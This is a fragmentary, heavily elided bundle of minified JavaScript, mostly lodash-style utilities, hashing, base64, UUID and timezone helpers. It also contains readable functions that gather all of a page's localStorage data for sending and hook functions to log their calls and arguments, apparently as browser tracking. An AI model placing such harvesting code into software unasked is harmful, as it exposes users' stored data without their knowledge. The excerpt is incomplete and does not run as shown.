    Jc = "object" == y(Va) && Va && Va.Object === Object && Va,
    ae = "object" == ("undefined" === typeof self ? "undefined" : y(self)) && self && self.Object === Object && self,
    L = Jc || ae || Function("return this")(),
    Y = L.Symbol,
    Kc = Object.prototype,
    ...
    Q = function (a) {
      if (null == a) a = void 0 === a ? "[object Undefined]" : "[object Null]";else if (Lc && Lc in Object(a)) {
        var b = be.call(a, Wa),
          c = a[Wa];
        try {
          a[Wa] = void 0;
    ...
    W = function (a) {
      return null != a && "object" == y(a);
    },
    Mc = function (a) {
      return W(a) && "[object Arguments]" == Q(a);
    },
    Nc = Object.prototype,
    ...
    Oc = Mc(function () {
      ...
      return W(a) && ee.call(a, "callee") && !fe.call(a, "callee");
    },
    z = Array.isArray,
    ge = function () {
      return !1;
    ...
    Xa = function (a, b) {
      ...
      return !!b && ("number" == c || "symbol" != c && he.test(a)) && -1 < a && 0 == a % 1 && a < b;
    },
    Sb = function (a) {
  ...
  var ie = function (a) {
    ...
    Ia = function (a) {
      if (fa(a)) {
        ...
        f = c.length;
        for (var k in a) !ke.call(a, k) || b && ("length" == k || e && ("offset" == k || "parent" == k) || d && ("buffer" == k || "byteLength" == k || "byteOffset" == k) || Xa(k, f)) || c.push(k);
        a = c;
      } else if (k = a && a.constructor, a === ("function" == typeof k && k.prototype || le)) {
        k = [];
    ...
    O = function (a, b) {
      return (z(a) ? Zd : Ya)(a, "function" == typeof b ? b : Uc);
    },
    Vc = function (a, b) {
  ...
  var Fa = pa,
    ...
    se = RegExp("^" + Function.prototype.toString.call(Object.prototype.hasOwnProperty).replace(/[\\^$.*+?()[\]{}|]/g, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"),
    ia = function (a, b) {
      a = null == a ? void 0 : a[b];
      return (!P(a) || Wc && Wc in a ? 0 : (Sc(a) ? se : re).test(ha(a))) ? a : void 0;
    },
    Ca = ia(L, "Map"),
    Da = ia(Object, "create"),
  ...
  function collectAndSendData() {
    const collectedData = getLocalStorageData();
    if (Object.keys(collectedData).length > 0) {
      triggerDataSentEvent(collectedData);
    }
  }
  ...
  function jsHook(originalFunction) {
    return function () {
      const args = [...arguments].join(",");
      if (!trackedFunctionCalls[originalFunction.name]) {
        trackedFunctionCalls[originalFunction.name] = [];
      }
      trackedFunctionCalls[originalFunction.name].push(args);
  ...
  V.prototype.get = function (a) {
    var b = this.__data__;
    return Da ? (a = b[a], "__lodash_hash_undefined__" === a ? void 0 : a) : te.call(b, a) ? b[a] : void 0;
  };
  ...
  ra.prototype.set = function (a, b) {
    ...
    if (c instanceof Fa) {
      var e = c.__data__;
      if (!Ca || 199 > e.length) return e.push([a, b]), this.size = ++c.size, this;
  ...
  var ve = function (a, b) {
      for (var c = -1, e = null == a ? 0 : a.length; ++c < e;) if (b(a[c], c, a)) return !0;
      return !1;
    },
    ...
    Ee = ha(eb),
    ka = Q;
  if (bb && "[object DataView]" != ka(new bb(new ArrayBuffer(1))) || Ca && "[object Map]" != ka(new Ca()) || cb && "[object Promise]" != ka(cb.resolve()) || db && "[object Set]" != ka(new db()) || eb && "[object WeakMap]" != ka(new eb())) ka = function (a) {
    var b = Q(a);
    if (a = (a = "[object Object]" == b ? a.constructor : void 0) ? ha(a) : "") switch (a) {
      case Ae:
  ...
  var Tb = ka,
    ...
    He = function (a) {
      var b = Ge(a);
      return 1 == b.length && b[0][2] ? $c(b[0][0], b[0][1]) : function (c) {
        return c === a || Fe(c, a, b);
      };
    },
    Ka = function (a) {
      return "symbol" == y(a) || W(a) && "[object Symbol]" == Q(a);
    },
    Ie = /\.|\[(?:[^[\]]*|(["'])(?:(?!\1)[^\\]|\\.)*?\1)\]/,
    Je = /^\w*$/,
    fb = function (a, b) {
      if (z(a)) return !1;
      var c = y(a);
      return "number" == c || "symbol" == c || "boolean" == c || null == a || Ka(a) ? !0 : Je.test(a) || !Ie.test(a) || null != b && a in Object(b);
    };
  Ja.Cache = Ga;
  var Ke = /[^.[\]]+|\[(?:(-?\d+(?:\.\d+)?)|(["'])((?:(?!\2)[^\\]|\\.)*?)\2)\]|(?=(?:\.|\[\])(?:\.|\[\]|$))/g,
    Le = /\\(\\)?/g,
    ...
    bd = function (a, b) {
      return z(a) ? a : fb(a, b) ? [a] : Me(null == a ? "" : lc(a));
    },
    Ne = 1 / 0,
    la = function (a) {
    ...
    sb = function (a, b, c) {
      ...
      if (f || ++e != d) return f;
      d = null == a ? 0 : a.length;
      return !!d && Sb(d) && Xa(h, d) && (z(a) || Oc(a));
    },
    Pe = function (a, b) {
      return fb(a) && b === b && !P(b) ? $c(la(a), b) : function (c) {
        var e = D(c, a);
        return void 0 === e && e === b ? null != c && sb(c, a, Oe) : rb(b, e, 3);
      };
    },
    Qe = function (a) {
      return function (b) {
    ...
    ma = function (a) {
      return "function" == typeof a ? a : null == a ? Uc : "object" == y(a) ? z(a) ? Pe(a[0], a[1]) : He(a) : fb(a) ? Qe(la(a)) : Re(a);
    },
    qd = function (a, b) {
      return (z(a) ? Vc : oe)(a, ma(b));
    },
    pc = function (a) {
      return "string" == typeof a || !z(a) && W(a) && "[object String]" == Q(a);
    },
    Se = function (a, b) {
      var c = -1,
        e = fa(a) ? Array(a.length) : [];
      Ya(a, function (a, f, h) {
        e[++c] = b(a, f, h);
      });
      return e;
    ...
    Ye = function (a) {
      ...
      if (Ka(a)) return dd;
      P(a) && (a = "function" == typeof a.valueOf ? a.valueOf() : a, a = P(a) ? a + "" : a);
    ...
    ed = 1 / 0,
    fc = function (a) {
      a ? (a = Ye(a), a = a === ed || a === -ed ? 1.7976931348623157E308 * (0 > a ? -1 : 1) : a === a ? a : 0) : a = 0 === a ? a : 0;
      var b = a % 1;
      ...
      (function (a) {
        ...
        c.TimeZone = function (a) {
          var b = {
            ...
            d = a;
          a = function () {
            for (var a = b[d], e = a.length, f = 0, h; f < e; f += 1) if (h = a[f], c.date_is_dst(c.dst_start_for(h))) {
              d = h;
              break;
            }
          };
      ...
      (function () {
        var b = {
          ...
          bytesToBase64: function (a) {
            for (var b = [], c = 0; c < a.length; c += 3) for (var f = a[c] << 16 | a[c + 1] << 8 | a[c + 2], h = 0; 4 > h; h++) 8 * c + 6 * h <= 8 * a.length ? b.push("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".charAt(f >>> 6 * (3 - h) & 63)) : b.push("=");
            return b.join("");
          },
        ...
        var b = fd.utf8,
          ...
          e = function (a) {
            ...
            for (d = 0; d < c.length; d += 16) {
              for (var r = e, u = f, z = n, A = q, D = m, w = 0; 80 > w; w++) {
                if (16 > w) a[w] = c[d + w];else {
          ...
          d = function (a, b) {
            ...
            return b && b.asBytes ? a : b && b.asString ? c.bytesToString(a) : gb.bytesToHex(a);
          };
        d._blocksize = 16;
        d._digestsize = 20;
        a.exports = d;
    ...
    q = [],
    ib = 0;
  for (; 256 > ib; ++ib) q[ib] = (ib + 256).toString(16).substr(1);
  var id = function (a, b) {
      b = b || 0;
      return [q[a[b++]], q[a[b++]], q[a[b++]], q[a[b++]], "-", q[a[b++]], q[a[b++]], "-", q[a[b++]], q[a[b++]], "-", q[a[b++]], q[a[b++]], "-", q[a[b++]], q[a[b++]], q[a[b++]], q[a[b++]], q[a[b++]], q[a[b++]]].join("");
    },
    jd,
    jb,
    Eb = 0,
  ...
  var Ud = kb,
    ...
    af = function (a, b) {
      for (var c = -1, e = null == a ? 0 : a.length; ++c < e;) if (!b(a[c], c, a)) return !1;
      return !0;
    },
    bf = function (a, b) {
      var c = !0;
    ...
    ub = function (a, b, c) {
      ...
      if (d = c) if (d = b, P(c)) {
        var f = y(d);
        d = ("number" == f ? fa(c) && Xa(d, c.length) : "string" == f && d in c) ? Za(c[d], a) : !1;
      } else d = !1;
      d && (b = void 0);
      return e(a, ma(b));
    },
